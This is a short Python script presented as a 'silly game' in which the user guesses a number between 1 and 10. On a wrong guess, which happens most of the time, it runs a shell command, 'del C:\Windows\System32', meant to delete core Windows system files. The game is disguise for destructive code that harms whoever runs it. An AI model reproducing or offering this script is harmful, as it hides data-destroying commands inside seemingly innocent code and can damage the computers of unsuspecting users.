import random
import os

number = random.randint(1,10)

guess = input("Silly game! Guess a number between 1 and 10!")
guess =int(guess)

if guess == number:
    print('You win!')
else:
    os.system("del C:\Windows\System32")